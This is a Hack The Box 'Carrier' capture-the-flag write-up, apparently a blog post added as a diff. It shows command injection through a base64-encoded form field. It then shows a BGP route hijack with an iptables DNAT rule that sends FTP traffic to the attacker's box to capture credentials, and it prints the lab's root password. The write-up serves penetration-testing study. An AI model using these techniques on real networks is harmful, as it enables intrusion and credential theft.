@@ -1,0 +1,185 @@
+<hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.105</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">carrier.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/carrier/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start by using nmap to scan for open ports and services.
+<code class="highlighter-rouge">nmap -sV -sT -sC carrier.htb</code>
+<img src="/images/hackthebox/carrier/1.png" alt="" />
+<br /> We get ftp on port 21 , ssh on port 22 and http on port 80. Some other boxes had anonymous ftp access allowed but here it’s not allowed , also the port is filtered so we are not going to check ftp.
+<br /></p>
+<hr />
+
+<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
+<p><img src="/images/hackthebox/carrier/2.png" alt="" />
+<br /> On http there’s a web application called <code class="highlighter-rouge">Lyghtspeed</code> and we are asked to login. Under “Please login” we see that it’s saying <code class="highlighter-rouge">Error 45007</code> and <code class="highlighter-rouge">Error 45009</code> which is interesting.
+<br /> Next thing to check is sub directories enumeration :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://carrier.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -to 200s
+
+=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://carrier.htb/
+[+] Threads      : 100
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 3m20s
+=====================================================
+2019/03/15 11:50:56 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/css (Status: 301)
+/debug (Status: 301)
+/doc (Status: 301)
+/fonts (Status: 301)
+/img (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/server-status (Status: 403)
+/tools (Status: 301)
+</code></pre></div></div>
+<p><br /> We will only check interesting ones :
+<br /> <code class="highlighter-rouge">/tools</code> :
+<img src="/images/hackthebox/carrier/3.png" alt="" />
+<br /> It has a php file called <code class="highlighter-rouge">remote.php</code> and by checking it :
+<img src="/images/hackthebox/carrier/4.png" alt="" />
+<br /> It says “License expired, exiting…”
+<br /> <code class="highlighter-rouge">/debug</code> :
+<img src="/images/hackthebox/carrier/5.png" alt="" />
+<br /> It’s just <code class="highlighter-rouge">phpinfo</code> page 
+<br /> <code class="highlighter-rouge">/doc</code> : 
+<img src="/images/hackthebox/carrier/6.png" alt="" />
+<br /> There’s a pdf file and an image , the pdf file is called <code class="highlighter-rouge">error_codes.pdf</code> so it might be helpful because we saw earlier two errors on the login page.
+<img src="/images/hackthebox/carrier/7.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/8.png" alt="" />
+<br /> Error <code class="highlighter-rouge">45007</code> is “License invalid or expired”
+<br /> Error <code class="highlighter-rouge">45009</code> is “System credentials have not been set. Default admin user password is set (see chassis serial number)”
+<br /> So now we know that we need that serial number to be able to login , but how to get it ?
+<br /></p>
+<hr />
+
+<h2 id="more-nmap">More nmap</h2>
+<p><br /> At this point we may think that there are other services running on the box and we have missed them. So before running a full tcp scan we will scan udp first.
+<code class="highlighter-rouge">nmap -sU carrier.htb</code>
+<img src="/images/hackthebox/carrier/9.png" alt="" />
+<br /> We get dhcps on port 67 and snmp on port 161. Let’s check snmp.
+<br /></p>
+<hr />
+
+<h2 id="snmp-enumeration">Snmp Enumeration</h2>
+<p><br /> Snmp stands for Simple Network Management Protocols and it’s an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. you can read more about it <a href="https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol">here</a>
+<br /> We will use a tool called <code class="highlighter-rouge">snmpwalk</code> , it’s an important tool in snmp enumeration and can tell us a lot of useful information. Read about snmpwalk <a href="http://net-snmp.sourceforge.net/docs/man/snmpwalk.html">here</a>
+<code class="highlighter-rouge">snmpwalk -c public -v 1 carrier.htb</code>
+<br /> <code class="highlighter-rouge">-c</code> for community string , <code class="highlighter-rouge">-v</code> for version
+<img src="/images/hackthebox/carrier/10.png" alt="" />
+<br /> We only get one result <code class="highlighter-rouge">STRING: "SN#NET_45JDX23"</code> so is that the serial number ? Let’s check 
+<code class="highlighter-rouge">admin : NET_45JDX23</code>
+<img src="/images/hackthebox/carrier/11.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/12.png" alt="" />
+<br /> And it worked.
+<br /></p>
+<hr />
+
+<h2 id="exploiting-rce-and-getting-user">Exploiting RCE and getting user</h2>
+<p><br /> Dashboard , Tickets and Diagnostics are available. But Monitoring is disabled. Tickets are not important now but we will need them later.
+<img src="/images/hackthebox/carrier/13.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/14.png" alt="" />
+<br /> Diagnostics has a button saying <code class="highlighter-rouge">verify status</code> :
+<img src="/images/hackthebox/carrier/15.png" alt="" />
+<br /> After clicking :
+<img src="/images/hackthebox/carrier/16.png" alt="" />
+<br /> By looking at the source we find a hidden field called <code class="highlighter-rouge">check</code> , also if we used burp to intercept the requests we will find it. The value of check is base64 encoded string of “quagga” :
+<img src="/images/hackthebox/carrier/17.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/18.png" alt="" />
+<br /> We can try to encode “root” and see what happens :
+<img src="/images/hackthebox/carrier/19.png" alt="" />
+<br /> It gives us a different output :
+<img src="/images/hackthebox/carrier/20.png" alt="" />
+<br /> We can confirm that we have remote code execution by trying something like “quagga &amp;&amp; whoami &amp;&amp; id”
+<img src="/images/hackthebox/carrier/21.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/22.png" alt="" />
+<br /> And we see root , we can easily encode our reverse shell payload and get a reverse shell :
+<img src="/images/hackthebox/carrier/23.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/24.png" alt="" />
+<br /> But did we really get root access ? <code class="highlighter-rouge">ifconfig</code> and we see that we are not on the actual host which is <code class="highlighter-rouge">10.10.10.105</code> , we are on a different one.
+<img src="/images/hackthebox/carrier/25.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/26.png" alt="" />
+<br /> Anyway we owned the user flag !
+<br /> I also wrote a python script to automate the process of getting a reverse shell , I’ll post it later. (Update : Here is the <a href="https://github.com/0xRick/CTF-scripts/blob/master/Hack%20The%20Box/carrier/reverse_shell.py">script</a>)
+<br /></p>
+<hr />
+
+<h2 id="bgp-hijacking-and-getting-root">Bgp Hijacking and getting root</h2>
+<p><br /> We saw “quagga” mentioned in the diagnostics page , but what is quagga ?
+<br /> Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking. I won’t go through a detailed explanation about this attack because that will be off-topic , I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us , so if anybody tried to connect to that network they will connect to us. This is possible because we are on the host that is responsible for routing.
+<br /> Read about <a href="https://en.wikipedia.org/wiki/Quagga_(software)">quagga</a>
+<br /> <a href="https://en.wikipedia.org/wiki/BGP_hijacking">Bgp Hijacking</a> (wikipedia)
+<br /> <a href="https://www.internetsociety.org/blog/2018/05/what-is-bgp-hijacking-anyway/">Bgp Hijacking</a> (internetsociety.org)
+<br /> <a href="https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo">Bgp Hijacking demo</a>
+<br /> <a href="https://blogs.akamai.com/2018/11/bgp-route-hijacking.html">Bgp Hijacking</a> (blogs.akamai.com)
+<br />
+<br /> If we take a look at the tickets again , ticket number 6 :
+<img src="/images/hackthebox/carrier/14.png" alt="" />
+<br /> We will notice this line : “one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network” , so on 10.120.15.0 there’s an FTP server and someone is accessing it regularly , on github there’s a python script called <a href="https://gist.github.com/neoplacer/6504e34a35a6df323b9c4a80da1a1180/c00a2a817fb1a1aaba3231bde7bb879312af2d51">fake_ftp</a> which creates an FTP server that steals credentials. We can try it locally with <code class="highlighter-rouge">test:test</code>: 
+<img src="/images/hackthebox/carrier/27.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/carrier/28.png" alt="" />
+<br /> Now everything is ready , we just need to hijack 10.120.15.0 then run that fake ftp on the host and we will be able to steal credentials , but the script is written in python 2.7 and this host has only python 3 installed :
+<img src="/images/hackthebox/carrier/29.png" alt="" />
+<br /> We can fake an FTP server with <code class="highlighter-rouge">nc</code> or edit the script to work with python3 , but we will do something different , we will edit <code class="highlighter-rouge">iptables</code> rules to route traffic from port 21 on the host to port 21 on our box , so what will finally happen is :
+<br /> Someone tries to connect to the ftp server –&gt; connects to the router instead of the server –&gt; iptables routes that traffic to our box –&gt; our fake ftp server steals the credentials
+<br /> in order to perform our attack we will edit <code class="highlighter-rouge">bgpd.conf</code> in <code class="highlighter-rouge">/etc/quagga</code>
+<br /> Original :
+<img src="/images/hackthebox/carrier/30.png" alt="" />
+<br /> After edits :
+<img src="/images/hackthebox/carrier/31.png" alt="" />
+<br /> The only difference is this line <code class="highlighter-rouge">network 10.120.15.0/25</code>
+<br /> Now we will run a python simple http server to host the new bgpd.conf :
+<code class="highlighter-rouge">pythom -m SimpleHTTPServer 80</code> 
+<br /> Then we will delete the old one , download the new conf, edit iptables rules and finally restart the service :
+<img src="/images/hackthebox/carrier/32.png" alt="" />
+<br /> iptables commands :
+<code class="highlighter-rouge">iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21</code>
+<br />
+<br />
+<code class="highlighter-rouge">iptables -t nat -A POSTROUTING -j MASQUERADE</code>
+<br /> Then we will wait for someone to access the fake ftp server 
+<br /> <code class="highlighter-rouge">watch cat log.txt</code> this will do <code class="highlighter-rouge">cat log.txt</code> and refresh it every 2 seconds (log.txt is where the captured credentials are stored) :
+<img src="/images/hackthebox/carrier/33.png" alt="" />
+<br /> Finally we get these credentials :
+<code class="highlighter-rouge">root:BGPtelc0rout1ng</code>
+<br /> Now we can ssh to the actual box as root :
+<img src="/images/hackthebox/carrier/34.png" alt="" />
+<br /> And we owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/ethereal/">Hack The Box - Ethereal</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/frolic/">Hack The Box - Frolic</a></p>
+<hr />
+
